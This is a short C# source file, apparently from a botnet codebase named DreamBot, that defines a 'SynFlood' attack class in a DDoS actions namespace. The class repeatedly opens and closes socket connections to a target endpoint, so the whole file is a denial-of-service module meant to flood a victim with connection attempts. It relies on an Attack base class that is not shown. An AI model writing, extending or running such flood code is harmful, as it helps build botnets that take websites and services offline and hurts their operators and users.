using System;
using System.Net;
using System.Net.Sockets;

namespace DreamBot.Actions.DDoS
{
    class SynFlood : Attack
    {
        public SynFlood(EndPoint endpoint) 
            : base(endpoint)
        {
        }

        protected override void DoIt(Socket socket)
        {
            socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.DontLinger, true);
            socket.BeginConnect(_endpoint, OnConnected, socket);
        }

        private static void OnConnected(IAsyncResult ar)
        {
            try
            {
                ((Socket)ar.AsyncState).Close();
            }
            catch { }
        }
    }
}